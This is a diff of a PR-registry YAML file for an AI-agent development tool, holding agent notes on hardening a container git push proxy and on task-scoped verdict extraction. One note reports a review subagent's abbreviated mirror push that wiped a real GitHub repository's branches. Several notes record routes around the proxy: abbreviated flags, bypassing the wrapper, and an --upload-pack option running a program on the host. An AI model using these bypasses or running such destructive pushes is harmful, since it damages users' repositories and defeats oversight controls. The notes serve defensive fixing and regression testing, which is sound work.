+      requests all rejected with the expected explicit messages and nothing pushed.
+      Regression test test_impl_and_qa_get_distinct_proxies passes at HEAD. Driver
+      caveat for the next run: the in-container git wrapper only intercepts when $1
+      is push/fetch/pull/ls-remote, so `podman exec $CTR git -C /workspace push ...`
+      bypasses the proxy (pre-existing, out of scope) - drive pushes as `podman exec
+      $CTR bash -c "cd /workspace && git push ..."`. Captures: /pm-captures/scenarios/4/{story12-socket-loss-heal,story3-daemon-crash-heal,story4-refusals}.'
+    created_at: '2026-10-28T00:04:59Z'
+    last_edited: '2026-10-28T00:04:59Z'
+  - id: note-6a3426f
+    text: 'QA scenario 5 (2026-10-28): PASS. Harness prerequisites for a re-run: (1)
+      the fake-claude qa_planning body must NOT include QA_PLAN_START/QA_PLAN_END
+      — fake-claude appends the markers itself, and including them makes the planner
+      poll reject the plan as ''already-closed block (plan truncated)''; (2) the QA
+      worker''s ~/.local/bin/git wrapper forwards fetch/pull/ls-remote to a host workdir
+      that cannot resolve this container''s /scratch paths, so install a /tmp/pm-venv/bin/git
+      shim that always execs /usr/bin/git before running pm (the scenario upstreams
+      are local file:// repos). Verified: shared stop of the s1 QA scenario removed
+      its socket+proxy.json and kept the dir+discovery link, s2/impl proxies kept
+      serving and pushed, session kill removed every trace (links, dirs, locks, daemons,
+      containers), and killing project A left project B''s proxy/pid/socket intact
+      with its push still working.'
+    created_at: '2026-10-28T00:20:51Z'
+    last_edited: '2026-10-28T00:20:51Z'
+  - id: note-430b16a
+    text: 'Concretizer (scenario 6), 2026-10-27: container names embed the session
+      tag verbatim and podman rejects [ ] * ? in names ("names must match [a-zA-Z0-9][a-zA-Z0-9_.-]*").
+      So a glob-bearing project dir can never launch a container-mode session: pm
+      pr start starts the shared push proxy, then podman run --name pm-<tag>-impl-<pr>
+      fails with the generic "Is podman running?" ContainerError, leaving the hashed
+      proxy dir + long-name discovery link + lock in /tmp. Scenario 6 story 3 is driven
+      from exactly that state: pm session kill must sweep all three via the glob-escaped
+      tag discovery-link glob while a sibling session proxy stays live (verified end-to-end
+      at HEAD). Container names are not sanitized here; if that is wanted it is a
+      separate fix. Sandbox notes: run pm container build-base from the throwaway
+      project dir after nested_podman:true (~3 min under nested podman); the sandbox
+      ~/.local/bin/git wrapper must not precede /usr/bin in PATH for host-side pm
+      commands, since it forwards push/fetch/pull/ls-remote to the host workdir.'
+    created_at: '2026-10-27T23:32:42Z'
+    last_edited: '2026-10-27T23:32:42Z'
+  - id: note-472d7a9
+    text: 'Impl (2026-10-28): sign-off routed this back (SIGNOFF_IMPL) for the master@f2650b46
+      integration conflict. Resolved in merge commit fa3d7678. The only conflict was
+      the single project.active_pr scalar; kept master''s pr-e102089, because both
+      sides had set active_pr only as a side-effect of filing a new PR entry (ours
+      pr-e618b9c, master pr-e102089) and neither was a deliberate focus decision.
+      Both PR entries and every note on both sides are preserved (501 PRs, identical
+      per-id content, note-id union verified against both parents, project.yaml loads
+      cleanly through pm_core.store with validation). No code change: the push-proxy
+      fix is unchanged, so the QA evidence at dfa769cb still holds. Tests at the merge:
+      tests/test_push_proxy.py + tests/test_container.py 238 passed; full suite 3911
+      passed, 1 skipped, 0 failed.'
+    created_at: '2026-10-28T01:12:34Z'
+    last_edited: '2026-10-28T01:12:34Z'
+  - id: note-4f0be23
+    text: 'QA S8 (2026-10-28, container mode, nested podman): PASS at d766d5c4. Registry
+      intact: pm pr list exit 0 / 501 lines / active marker on pr-e102089; pm pr show
+      x3 (Title/Status/Branch, no Workdir); pm pr note list 29 notes, first note-6245c1d,
+      last note-472d7a9, first 28 identical+ordered vs dfa769cb. Tests: both modules
+      238 passed (174 s); repro 1 passed at candidate, 1 failed at base 74462d76 with
+      assert 1 == 3 at tests/test_push_proxy.py:1170 (all three on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Container mode: impl + QA scenario on one PR got distinct workdir-keyed proxies
+      (same pm-push-proxy-<tag>-<pr>- prefix, tokens dbf479b8dca77bac / 46c02c37d67bf3fd),
+      exactly two, impl mount+pid unchanged by the QA start, both ls-remote exit 0,
+      and impl A -> qa B -> impl C each landed its own commit as a fast-forward with
+      neither clone local ref moved by the other push. Teardown (C-c, pm container
+      cleanup --pr, pm session kill) removed both containers, both proxy dirs, and
+      both daemons self-exited within 5 s. HARNESS PREREQUISITE for the next container-mode
+      run (the S5 note is insufficient here): the sandbox ~/.local/bin/git wrapper
+      has HOST_WORKDIR baked to this scenario host workdir and forwards push/fetch/pull/ls-remote
+      to the real host, which cannot resolve a container-local file:// upstream (/tmp/tmp.*/upstream.git)
+      - pm qa run then dies in the planner handoff with "does not appear to be a git
+      repository" / Result: INPUT_REQUIRED. A /tmp/pm-venv/bin/git shim does NOT help:
+      the pm-created pane PATH is ~/.local/bin:/home/pm/.local/share/pm/venv/bin:/usr/local/bin:...
+      and never includes /tmp/pm-venv/bin. What works: back up ~/.local/bin/git and
+      replace it with a shim that execs /usr/bin/git (restore afterwards). That does
+      not affect the containers own /run/pm-push-proxy wrappers. Also pm-dev:latest
+      is not prebuilt - run pm container build-base first (~4 min). Captures: /pm-captures/scenarios/8/{registry-surfaces,pr-notes,container-proxies}.'
+    created_at: '2026-10-28T02:54:22Z'
+    last_edited: '2026-10-28T02:54:22Z'
+  - id: note-67f367f
+    text: 'QA S9 (2026-10-28, container mode, nested podman, real file:// upstream,
+      private PM_TMUX_SOCKET): PASS. Two PRs in one project (pr-7405909 alpha / pr-cb1fbf8
+      beta) each got a distinct workdir-keyed proxy dir /tmp/pm-push-proxy-<tag>-<prid>-<token>;
+      each proxy.json recorded its own workdir+allowed_branch with distinct pids (12984
+      vs 13984); each container mounted its own dir and git ls-remote worked from
+      both. Each push landed only its own branch (upstream tip == that container HEAD,
+      other branch unchanged). Cross-branch push from beta container onto alpha branch
+      exited 1 with the exact message "push-proxy: rejected — pushing to ''pm/pr-7405909-alpha-feature''
+      is not allowed, only ''pm/pr-cb1fbf8-beta-feature''"; neither branch moved;
+      beta proxy kept the same pid/socket and its own push then worked. Restarting
+      alpha impl window recreated its container (new Id/StartedAt) while reusing the
+      same D1 proxy (pid 12984 unchanged, proxy.json unchanged, mount source still
+      D1) and the drive pane printed "PR pr-7405909 is already in_progress, reusing
+      existing workdir."; both containers then pushed only their own branches; beta
+      container Id/StartedAt and proxy untouched. Tests: tests/test_push_proxy.py
+      + tests/test_container.py 238 passed (venv --system-site-packages, pytest<9;
+      reproduction test test_impl_and_qa_get_distinct_proxies passed). Captures: /pm-captures/scenarios/9/{story1-separate-proxies,story2-cross-branch,story3-restart-reuse}.
+      Driver caveats for a re-run: drive container pushes as podman exec $CTR bash
+      -c "cd /workspace && git push ..." (podman exec $CTR git -C /workspace push
+      bypasses the wrapper); keep the project dir name short so the socket dir keeps
+      its readable <tag>-<pr>-<token> form; pipe-pane -o with an already-open pipe
+      is a no-op, so reopen without -o for a second transcript.'
+    created_at: '2026-10-28T02:57:42Z'
+    last_edited: '2026-10-28T02:57:42Z'
+  - id: note-1653ab5
+    text: 'QA S10 (2026-10-28, container mode, nested podman, throwaway file:// fixture):
+      PASS on the workdir-keyed proxy focus. Two containers on one PR workdir shared
+      one socket dir + daemon (impl+review), pushed the same branch concurrently (both
+      rc 0) and a follow-up push advanced upstream; impl + two QA scenario clones
+      each got their own socket dir/daemon (pids 19160/21115/21116) and three simultaneous
+      pushes produced exactly one winner with ordinary git rejections in the two losers;
+      both losers then pull --rebase + push through their unchanged daemons and the
+      branch ends with all three markers. Incidental, out of scope, filed as pr-436d18a:
+      `pm container cleanup --pr <id>` silently removes nothing on podman 3.4.4 (a
+      tab in `podman ps --format` renders as spaces, so the parsed name includes the
+      status; rm fails and is swallowed while the CLI still prints "Removed N"). Also
+      note for future scenario scripts: `git cat-file -e` against the upstream object
+      DB is not a valid "loser commit absent" check (a ref-lock-rejected push has
+      already transferred its objects); use merge-base --is-ancestor against the branch
+      tip, and read refs/remotes/origin/<branch> in a fresh clone, not refs/heads/<branch>.'
+    created_at: '2026-10-28T03:01:24Z'
+    last_edited: '2026-10-28T03:01:24Z'
+  - id: note-a473d00
+    text: 'QA S7 (2026-10-28, container mode, nested podman, real file:// upstream):
+      PASS. R3 reuse verified end-to-end: review and sign-off containers on the PR
+      workdir mount the SAME /run/pm-push-proxy dir as the impl container (proxy.json
+      workdir/allowed_branch/pid and the socket inode all unchanged; exactly one live
+      proxy dir for the PR workdir); closing review+sign-off leaves the shared proxy
+      serving and the impl push lands; reverse order (live QA proxy first, then pm
+      pr start) gives the impl a distinct workdir-keyed dir and leaves the QA proxy
+      pid/inode/mount untouched, with impl then QA pushes each landing on the branch
+      and neither moving the other clone ref. Harness caveats for a re-run: (1) `pm
+      qa run` aborts with INPUT_REQUIRED when the PR has no QA spec and `pm pr spec`
+      generates one via `claude -p` (not allowed here) - seed pm/specs/<pr>/qa.md
+      in the PR workdir instead; (2) with containers the QA scenario container is
+      created BEFORE concretization, so the fake qa_concretize 900 s delay keeps the
+      container live without blocking its appearance; (3) killing an impl window leaves
+      that workdir shared proxy dir+socket in /tmp until `pm session kill` (known
+      cross-process refcount residual, #241/pr-ac12b47), and the dual-remote push
+      target (/tmp/<base>/repo plus the file:// upstream) must both be reset if you
+      rewind a fixture branch between takes or the first push URL rejects non-fast-forward
+      and the container push exits 1. Captures: /pm-captures/scenarios/7/{story1-review-joins,story2-review-relaunch,story3-signoff-joins,story4-stop-review-signoff,story5-reverse-order}.'
+    created_at: '2026-10-28T03:15:47Z'
+    last_edited: '2026-10-28T03:15:47Z'
+  - id: note-eb65472
+    text: 'QA S10 follow-up (2026-10-28): re-ran all three stories with asciinema
+      after the review flagged the missing story-1 capture. Story 1 is now recorded
+      end-to-end in the session ops pane: pm pr start + pm pr review, pm pr show prints
+      Workdir, both containers share one socket dir and pid 11952, the review container
+      makes commit 80b737d, both containers push concurrently (both rc 0, one log
+      says Everything up-to-date), ls-remote rc 0, a follow-up push from impl exits
+      0 with upstream tip == workdir HEAD (aa89358), pid unchanged. Story 2 re-run
+      after resetting the fixture to f4075b6: impl rc 1, qa s1 rc 0, qa s2 rc 1; both
+      losers rejected client-side with (fetch first), so the literal git cat-file
+      -e check holds this time (both loser objects absent, winner present); tip ==
+      qa s1 commit, pre-push commit still an ancestor, losers unreachable, each clone
+      holds only its own commit, all three proxies alive with unchanged pids. Note
+      that the earlier run had a server-side ref-lock rejection, which transfers objects
+      before failing, so cat-file -e is timing-dependent - reachability from the branch
+      is the invariant that matters. The fresh-clone literal check refs/heads/<branch>
+      cannot hold for a normal clone (only the checked-out branch gets a local ref);
+      refs/remotes/origin/<branch> is the correct ref and equals the tip. Captures:
+      /pm-captures/scenarios/10/{story1-shared-proxy,story2-concurrent-push,story3-rebase-recovery},
+      all three with recording.cast + recording.mp4.'
+    created_at: '2026-10-28T03:34:01Z'
+    last_edited: '2026-10-28T03:34:01Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
 - id: pr-48cb564
   plan: improvements
   title: 'Picker popup: indicate per-session window-selected state with ● vs ○'
@@ -22426,11 +23489,160 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-13T14:15:50.184464+00:00'
-  updated_at: '2026-05-13T14:15:50.184464+00:00'
+  updated_at: '2026-10-27T09:19:39.675237+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-163b8d7
+    text: 'Impl 2026-10-27 (commit 4f902f18): task-scoped verdict scan in pm_core/verdict_transcript.py.
+      extract_verdict_from_transcript now walks back across non-task user records
+      (isMeta loop ticks/autonomous checks, [SCHEDULED TASK - AUTOMATED FIRING ...]
+      /loop deliveries, Monitor <task-notification>, reminder-only/system-reminder-only
+      records, tool results) and stops at a genuine task boundary (initial prompt,
+      retry, verifier feedback, Stop-hook feedback). New find_verdict_turn returns
+      the verdict turn text + uuid/timestamp/line identity; the reason is read from
+      the verdict turn; poll_for_verdict / wait_for_follow_up_verdict / review_loop
+      adoption return the verdict-turn text so markers survive a postscript. qa_loop
+      records scenario_verdict_sources (pr_id/loop_id/scenario/session_id/turn_id)
+      in qa_resume.json and build_resume_state drops a verdict whose source no longer
+      matches the current attempt (no historical PASS resurrection, verification still
+      runs). Tests: tests/test_verdict_transcript.py replays the real scenario-44
+      /loop wakeup and #249 S71 Monitor postscript plus barrier/identity cases; tests/test_qa_loop.py
+      TestPollVerdictsAfterLoopWakeup; tests/test_qa_resume.py identity tests. Captures:
+      impl/pre-fix and impl/post-fix scenario44-replay (asciinema cast + mp4). Full
+      suite 3755 passed; pre-existing env failures only (test_hook_events standalone
+      receiver, 12 test_markdown_render missing markdown dep).'
+    created_at: '2026-10-27T04:50:36Z'
+    last_edited: '2026-10-27T04:50:36Z'
+  - id: note-a1cd0e9
+    text: 'Review i2 (68b5): (1) find_verdict_turn no longer resets the collected
+      turn text when it crosses a tool_result record — tool results belong to the
+      same assistant turn, so VerdictHit.text now really covers the whole turn (previously
+      text after a tool result inside the verdict turn was dropped, contradicting
+      the i1 contract); (2) qa_loop reads the reason from hit.text via new extract_reason_from_text
+      instead of re-scanning the transcript, removing a double full-file read and
+      the window where a wakeup turn appended between the two reads could supply a
+      different turn''s reason; (3) spec section 6 records the i1/i2 extensions (isCompactSummary
+      transparency, whole-turn hit.text, loop-derived verdicts carry no source, multi-reminder
+      records). Full suite 3774 passed, 1 pre-existing env failure (test_hook_events
+      standalone receiver). Log: /pm-captures/review-8efa789-i2/full-suite.log'
+    created_at: '2026-10-27T05:38:07Z'
+    last_edited: '2026-10-27T05:38:07Z'
+  - id: note-ecd5103
+    text: 'Review i3 (68b5): wait_for_follow_up_verdict now ignores the verdict that
+      prompted the call. Task-scoped scanning made the follow-up waiter (review_loop
+      / watcher_base INPUT_REQUIRED waits) re-return the stale INPUT_REQUIRED when
+      a /loop tick or Monitor postscript arrived before the human answered — the caller
+      then coerced it to NEEDS_WORK and ended the wait. The waiter snapshots the pre-call
+      verdict''s line_index and only accepts a hit at a later line (the transcript
+      is append-only); poll_for_verdict keeps the unguarded scan because it must return
+      a verdict emitted just before it is called. New test test_follow_up_verdict_ignores_the_verdict_that_prompted_it
+      (verified it fails without the guard). Also corrected the read_latest_assistant_text
+      docstring (verdict detection is raw-bytes, only the turn text depends on the
+      content schema) and recorded the behavior in spec section 6. Full suite 3762
+      passed, 1 skipped, 1 pre-existing env failure deselected (test_hook_events standalone
+      receiver).'
+    created_at: '2026-10-27T05:55:20Z'
+    last_edited: '2026-10-27T05:55:20Z'
+  - id: note-fad14b6
+    text: 'Review i4 (68b5): wait_for_follow_up_verdict takes an optional baseline_line,
+      snapshotted by _verify_single_scenario BEFORE it sends the re-verification prompt.
+      The i3 guard compared against a call-time scan, which is wrong for the only
+      caller that prompts the pane itself: qa_loop sends the follow-up, settles ~2s,
+      then waits, so an answer landing in that window was already in the transcript
+      and got rejected as "the verdict that prompted the call" — the waiter then blocked
+      until stop_check/pane death. Review/watcher waits keep the call-time scan (a
+      human answers a question the pane already asked). Tests: test_follow_up_verdict_honors_a_pre_prompt_baseline
+      (fails without the fix) and test_reverification_baselines_before_prompting_the_verifier.
+      Full suite 3706 passed; the 55 failures + 17 errors are identical on an origin/master
+      worktree (signoff_integration/merge_publish/git_ops env, 12 test_markdown_render
+      missing markdown dep, 1 test_hook_events standalone receiver). Spec section
+      6 updated. (2026-10-27T06:10:00Z)'
+    created_at: '2026-10-27T06:13:01Z'
+    last_edited: '2026-10-27T06:13:01Z'
+  - id: note-05d109c
+    text: 'Review i1 (5e61): the task-scoped scan matched verdict keywords against
+      the raw JSONL bytes, so a keyword appearing only inside a thinking block or
+      a tool_use input (a QA worker grepping the worktree for INPUT_REQUIRED, a file
+      the agent wrote) was reported as the verdict — find_verdict_turn returned VerdictHit(text=""),
+      making extract_verdict_from_transcript say INPUT_REQUIRED while the returned
+      turn text carried no verdict for parse_review_verdict / extract_between_markers
+      / reason parsing. find_verdict_turn now requires a text-bearing assistant record
+      and a hit additionally requires the keyword to occupy a whole line of the parsed
+      text (_text_line_is_verdict); markdown markers still tolerated and the raw-byte
+      boundary check is kept so acceptance does not widen. VerdictHit.text therefore
+      always contains the verdict. Tests: keyword only in a thinking block / in a
+      Grep tool_use input is not a verdict (both fail without the gate); hit.text
+      carries the verdict after a /loop wakeup. Corpus check over ~12.6k local transcripts:
+      21 false positives before, 0 after; the 4 remaining old-vs-new differences are
+      legitimate verdicts preserved across a wakeup. Full suite 3709 passed, 1 skipped;
+      55 failed + 17 errors identical to the master baseline. Log: /pm-captures/review-8efa789-5e61-i1/full-suite.log'
+    created_at: '2026-10-27T06:57:19Z'
+    last_edited: '2026-10-27T06:57:19Z'
+  - id: note-d836a9f
+    text: 'Review i2 (5e61): wait_for_follow_up_verdict now scans the transcript once
+      before entering the hook-event loop. The i4 baseline made an answer that landed
+      during qa_loop''s send/settle window acceptable but not observable: that answer''s
+      own idle_prompt fires before the waiter sets hook_baseline, and hook_events.wait_for_event
+      only returns events with timestamp > newer_than, so the waiter was never woken
+      by it and blocked until stop_check/pane death. The pre-wait scan uses the same
+      line_index > baseline_line guard, so it is a no-op for the human-answer callers
+      (review/watcher), whose baseline is the newest verdict at call time. test_follow_up_verdict_honors_a_pre_prompt_baseline
+      now writes no hook event at all (the real caller''s state) and fails without
+      the fix. Also documented _DEFAULT_REASON_VERDICTS (mirrors ALL_VERDICTS, kept
+      local to avoid the qa_loop import cycle) and recorded the behavior in spec section
+      6. Captures re-checked: /pm-captures/impl/{pre,post}-fix/scenario44-replay still
+      replay as documented (scenario 44 -> INPUT_REQUIRED, S71 -> PASS, control ->
+      PASS). Full suite 3709 passed, 1 skipped; the 55 failures + 17 errors are the
+      same env baseline as i4 (signoff_integration, merge_publish, git_ops, 12 test_markdown_render
+      missing markdown dep, 1 test_hook_events standalone receiver). Log: /pm-captures/review-8efa789-5e61-i2/full-suite-final.log'
+    created_at: '2026-10-27T07:28:29Z'
+    last_edited: '2026-10-27T07:28:29Z'
+  - id: note-d9b9477
+    text: 'Review i3 (5e61): (1) `[Request interrupted by user]` / `[Request interrupted
+      by user for tool use]` are now non-task records in `_NON_TASK_TEXT_PREFIXES`.
+      Claude Code writes them when the user hits Esc; treating them as a task boundary
+      made the task-scoped scan lose a verdict the pre-PR latest-turn scan still found.
+      Corpus sweep over ~33.5k local transcripts (old vs new extractor): 0 new false
+      positives, 5 genuine verdicts recovered across /loop + Monitor wakeups, and
+      the interruption variant was one of only two remaining old-vs-new drops. A follow-up
+      instruction typed after the interruption is a separate record and stays a barrier.
+      Tests: test_user_interruption_is_transparent (fails without the fix) and test_new_task_after_a_user_interruption_supersedes.
+      (2) Re-checked the `Stop hook feedback:` barrier and kept it — spec §6 now carries
+      the evidence: 193,105 of 193,107 occurrences in the corpus are hook_receiver.py
+      open failures, but the same receiver serves the idle_prompt hook, so when it
+      fails the QA loop gate never opens and nothing is polled; the barrier protects
+      the 1 genuine-instruction case. (3) Nits: dropped a dead `if hit is not None`
+      branch in _poll_tmux_verdicts, hoisted the lazy find_verdict_turn import in
+      _adopt_in_flight_review. Full suite 3711 passed, 1 skipped; 55 failed + 17 errors
+      identical to the master env baseline (signoff_integration/merge_publish/git_ops,
+      12 test_markdown_render missing markdown dep, 1 test_hook_events standalone
+      receiver). Log: /pm-captures/review-8efa789-5e61-i3-full-suite-final.log (2026-10-27T08:05:00Z)'
+    created_at: '2026-10-27T07:55:46Z'
+    last_edited: '2026-10-27T07:55:46Z'
+  - id: note-16ae068
+    text: 'QA S1 passed all four runtime stories (loop tick, Monitor notification,
+      new-task barrier, hidden keyword). Future-run note: qa_resume.json''s verified_scenarios
+      lags the final poll iteration, so a run whose last pending scenario is the only
+      one never shows its index live (pre-existing write cadence, identical write
+      sites on origin/master, unchanged by this PR); the TUI `PASS (verified)` log
+      line is authoritative. Captures: /pm-captures/scenarios/1.'
+    created_at: '2026-10-27T09:19:39Z'
+    last_edited: '2026-10-27T09:19:39Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
 - id: pr-06a96fa
   plan: plan-regression
   title: QA scenarios reuse regression tests as their flow driver
@@ -26581,11 +27793,29 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-23T03:14:54.863296+00:00'
-  updated_at: '2026-05-23T03:14:54.863296+00:00'
+  updated_at: '2026-10-27T04:50:44.346668+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-d8d9490
+    text: 'Coordination from pr-8efa789 (impl 4f902f18, pushed): verdict extraction
+      is now task-scoped, not latest-turn-only. It walks back across non-task wakeup
+      records (isMeta /loop ticks, [SCHEDULED TASK - AUTOMATED FIRING OF A CONFIGURED
+      PROMPT] deliveries, Monitor <task-notification>, reminder-only records, tool
+      results) and stops at a genuine task boundary. A retry that re-sends the original
+      prompt into the same session is a plain user message, so it IS a boundary: the
+      earlier verdict is not resurrected while the retry runs, and the retry turn
+      verdict wins once emitted. If your missing/incorrectly-formatted-output retry
+      writes a distinct prompt (not a bare re-send), that still works as a boundary;
+      avoid sending the retry as an isMeta/system-reminder-only record, which would
+      be treated as transparent and could surface the pre-retry verdict. pr-8efa789
+      does not implement the wall-clock deadline / max-idles / surfacing behavior
+      — that stays with you. Latest full suite on pr-8efa789: 3755 passed (2 pre-existing
+      env failures: test_hook_events standalone receiver; test_markdown_render missing
+      markdown dep).'
+    created_at: '2026-10-27T04:50:44Z'
+    last_edited: '2026-10-27T04:50:44Z'
 - id: pr-cfb0b3a
   plan: improvements
   title: 'Improvement: prompt sessions to use pm PR notes for cross-session handoff
@@ -32383,7 +33613,7 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-10-12T22:54:04.987012+00:00'
-  updated_at: '2026-10-12T22:56:41.644886+00:00'
+  updated_at: '2026-10-27T18:31:41.658322+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
@@ -32397,6 +33627,160 @@ prs:
       --show-toplevel == the container workdir, else exec real git.'
     created_at: '2026-10-12T22:56:41Z'
     last_edited: '2026-10-12T22:56:41Z'
+  - id: note-fcae10a
+    text: 'Scope extension 2026-10-27 (user-approved). This bug caused a production
+      incident. At 16:15:36 UTC a read-only review subagent of #241 (session 14a2d740,
+      subagent a42e1db1aa3bd6a93) created a throwaway bare repo under a temp dir and
+      ran `git push origin --mir` against it to check git''s option parsing. The in-container
+      wrapper forwarded the command to the host proxy, which replayed it in #241''s
+      workdir against the real GitHub origin with the user''s credentials. The proxy''s
+      broad-push check matches only the exact strings --all/--mirror/--tags, so the
+      abbreviated mirror push was accepted. Result: GitHub master force-rewound 450a6362
+      -> c0765071, 223 branches deleted, 71 open PRs auto-closed. All of it has been
+      restored from GitHub''s activity log and the PRs reopened. Evidence and backups:
+      ~/.pm/backups/incident-2026-10-27/; proxy log ~/.pm/debug/default.log 11:15:30-11:15:38
+      local.
+
+
+      Do all three in this PR:
+
+      1. Original fix: the wrapper forwards push/fetch/pull/ls-remote only when the
+      command''s repository (honouring -C and the cwd) is /workspace. Otherwise it
+      runs the real git locally.
+
+      2. Broad-push check: reject any option git would expand to --all, --mirror or
+      --tags (unambiguous prefixes, with or without =value), plus the --branches spelling
+      of --all. Use the prefix-matching approach #241 added for the program-executing
+      options in _check_dangerous_flags, sharing one helper if #241 lands first.
+
+      3. Regression tests against a sandboxed local bare remote, never a network remote.
+      (a) Replay the incident''s commands from the log above through the wrapper and
+      proxy. Assert that no ref except the allowed branch changes on the remote, checking
+      the remote''s actual refs rather than only the exit code. (b) A remote command
+      issued from a scratch repo outside /workspace runs against that scratch repo''s
+      own remote and never reaches the proxy.
+
+
+      Longer-term redesign (allow-list grammar, isolation from repo settings, least-privilege
+      identity, audit trail, red-team suite) is going into a separate plan; keep this
+      PR to the three items above.'
+    created_at: '2026-10-27T17:30:45Z'
+    last_edited: '2026-10-27T17:30:45Z'
+  - id: note-e8aad67
+    text: Safety for this PR's own sessions (impl, review, QA), 2026-10-27. You run
+      inside a container whose ~/.local/bin/git is the UNFIXED wrapper this PR repairs.
+      Any git push/fetch/pull/ls-remote typed in the container, in any directory,
+      is forwarded to the host proxy and run against the real GitHub origin with the
+      user's credentials. That is exactly how the incident happened. Until your fix
+      is installed in the container, run every git experiment and every test that
+      performs remote operations with the real binary (/usr/bin/git, or PATH without
+      /home/pm/.local/bin), and point it only at local bare repos under a temp dir.
+      Never replay the incident commands through the live wrapper or proxy. Tests
+      must exercise the wrapper script and PushProxy from the source tree against
+      a local test socket and remote, not the installed ones. GitHub ruleset 25978556
+      now blocks force pushes and branch deletions, but it does not stop branch creation,
+      and it does nothing about commands that run programs on the host.
+    created_at: '2026-10-27T17:41:45Z'
+    last_edited: '2026-10-27T17:41:45Z'
+  - id: note-f961bd1
+    text: 'Impl 2026-10-27: all three items done. (1) container.py _build_git_wrapper_script()
+      (new, testable: socket_path/container_workdir/real_git kwargs) forwards push/fetch/pull/ls-remote
+      only when `git [-C ...] rev-parse --show-toplevel --absolute-git-dir` equals
+      the workdir (pwd -P plus its git dir with GIT_DIR/GIT_WORK_TREE/GIT_COMMON_DIR
+      unset). Leading -C <dir> is honoured, so -C /workspace is now forwarded; any
+      other leading global (-c, --git-dir, ...) runs locally. (2) push_proxy._long_option_match
+      + _BROAD_PUSH_OPTIONS rejects --mir/--al/--br/--ta/--a/--t/--mirror=x etc. #241
+      has not landed, so _check_dangerous_flags is untouched (cross-PR note left on
+      pr-1139060). (3) tests/test_git_proxy_scope.py: sandboxed (real git forced first
+      on PATH, temp socket, file:// bare remote). It replays the 4 incident commands
+      (taken from the subagent transcript ~/.claude/projects/-workspace/14a2d740-.../subagents/agent-a42e1db1aa3bd6a93.jsonl)
+      from the scratch repo and from the workspace, and checks remote for-each-ref
+      snapshots. 12/19 fail on pre-fix code. Captures: /pm-captures/impl/{pre-fix,post-fix}/
+      (repro.sh shared), test log /pm-captures/impl/test-evidence/targeted.log (206
+      passed). Run tests with PATH=/usr/bin:/bin PYTHONPATH=/workspace. Out of scope
+      (redesign plan): repo-config broad pushes (remote.*.mirror, push.default=matching,
+      multiple pushurls; the incident push also hit a local pushurl).'
+    created_at: '2026-10-27T17:58:00Z'
+    last_edited: '2026-10-27T17:58:00Z'
+  - id: note-03256b5
+    text: 'S1 refine (1790ebc7): all 3 stories held live. Harness: run pm pr start
+      with PATH=<sbx>/bin:/usr/bin:/bin (no claude on PATH -> prints prompt, no Claude
+      launch) and HOME=<sbx>/home; start proxy with HOME=<sbx>/phome PATH=/usr/bin:/bin
+      from /tmp (log <sbx>/phome/.pm/debug/default.log) else it loops through the
+      wrapper and times out at 120s. Push nested project master to its origin BEFORE
+      adding origin-only commits, else pull --rebase fork-point drops the local pm
+      commit (pre-existing, unrelated). pytest not installed: pip install --target
+      <sbx>/pylibs "pytest<9" markdown; 192 passed.'
+    created_at: '2026-10-27T18:25:14Z'
+    last_edited: '2026-10-27T18:25:14Z'
+  - id: note-61a77a2
+    text: 'QA S1 2026-10-27: PASS on 1790ebc7 (192 passed; nested pm pr start and
+      the concurrent push held live; captures in /pm-captures/scenarios/1). Spec fix
+      for the next run: the story-3 bootstrap push of $N master is rejected non-fast-forward
+      because $N lacks "origin-only commit" from story 2. Run `git pull --rebase origin
+      master` in $N before `git push origin master`.'
+    created_at: '2026-10-27T18:31:41Z'
+    last_edited: '2026-10-27T18:31:41Z'
+  - id: note-1642e80
+    text: 'S2 refine (2026-10-27): verified live with source-tree wrapper+proxy. Proxy
+      log = $HOME/.pm/debug/<tag>.log of the HOME the proxy runs under (run proxy
+      with HOME=<sandbox>/home from a non-repo dir -> default.log). Reject text quotes
+      the whole shown string: ''--mir (read by git as --mirror)''. Container git 2.34.1
+      has no --branches: from scratch repo it errors "unknown option", --a errors
+      ambiguous, --mir mirrors into scratch origin only. Workspace fetch --upl=/bin/false
+      is forwarded and runs /bin/false proxy-side (fatal: Could not read from remote)
+      = known #241 residual. Commit before each legit-option push or re-push is a
+      no-op.'
+    created_at: '2026-10-27T18:19:44Z'
+    last_edited: '2026-10-27T18:19:57Z'
+  - id: note-13b2fc2
+    text: 'S4 refiner (2026-10-27, 1790ebc7): nested-podman path verified live, all
+      3 stories held. pm container build-base from the nested_podman:true project
+      took ~3 min (no Chromium failure). `pm pr start` in a pane of a fresh-TMUX_TMPDIR
+      session (fake-claude {"_all":{}}) makes container pm-<tag>-impl-<pr> + daemon
+      `<pm venv python> -m pm_core.push_proxy /tmp/pm-push-proxy-<tag>-<pr>/push.sock
+      ...` with PYTHONPATH=/workspace. The daemon PATH puts /home/pm/.local/bin FIRST,
+      so the outer wrapper must stay moved aside the whole run, or proxied pushes
+      would go to the real host proxy. Clone push URL fans out to the test project
+      dir + file:// origin. Evidence: proxy lines in ~/.pm/debug/<tag>.log. Image
+      git is 2.34: `--branches` is an unknown option (rc 129); scratch `pull --rebase`
+      needs `push -u` first.'
+    created_at: '2026-10-27T18:24:59Z'
+    last_edited: '2026-10-27T18:24:59Z'
+  - id: note-6f2dbcd
